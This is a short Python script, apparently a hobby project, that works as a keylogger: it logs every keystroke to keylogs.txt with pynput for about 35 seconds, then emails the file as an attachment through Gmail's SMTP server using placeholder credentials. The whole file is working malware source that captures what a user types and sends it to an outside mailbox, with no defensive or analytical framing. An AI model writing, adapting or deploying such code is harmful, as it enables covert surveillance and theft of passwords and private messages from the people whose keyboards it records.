from pynput.keyboard import Key, Listener
import logging
import multiprocessing


import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


def bar():
    print("Tick")

    log_dir = ""

    logging.basicConfig(
        filename=(log_dir + "keylogs.txt"),
        level=logging.DEBUG,
        format="%(asctime)s: %(message)s",
    )

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    # Start bar as a process
    p = multiprocessing.Process(target=bar)
    p.start()

    # Wait for 10 seconds or until process finishes
    p.join(35)

    # If thread is still active
    if p.is_alive():
        print("running... let's kill it...")

        # Terminate - may not work if process is stuck for good
        p.terminate()
        # OR Kill - will work for sure, no chance for process to finish nicely however
        # p.kill()

        p.join()

    mail_content = """Hi,
We're including some attachments in this email.
The SMTP package in Python is used to send the email.
    """
    # The mail addresses and password
    sender_address = "**********@gmail.com"
    sender_pass = "*************"
    receiver_address = "**********.gmail.com"
    # Setup the MIME
    message = MIMEMultipart()
    message["From"] = sender_address
    message["To"] = receiver_address
    message["Subject"] = "A test mail sent by Python. It has an attachment."
    # The subject line
    # The body and the attachments for the mail
    message.attach(MIMEText(mail_content, "plain"))
    attach_file_name = "keylogs.txt"
    attach_file = open(attach_file_name, "rb")  # Open the file as binary mode
    # payload = MIMEBase('application', 'octate-stream')
    payload = MIMEBase("application", "txt", Name="keylogs.txt")
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload)  # encode the attachment
    # add payload header with filename
    payload.add_header("Content-Decomposition", "attachment", filename=attach_file_name)
    message.attach(payload)
    # Create SMTP session for sending the mail
    session = smtplib.SMTP("smtp.gmail.com", 587)  # use gmail with port
    session.starttls()  # enable security
    # login with mail_id and password
    session.login(sender_address, sender_pass)
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    print("Mail Sent")
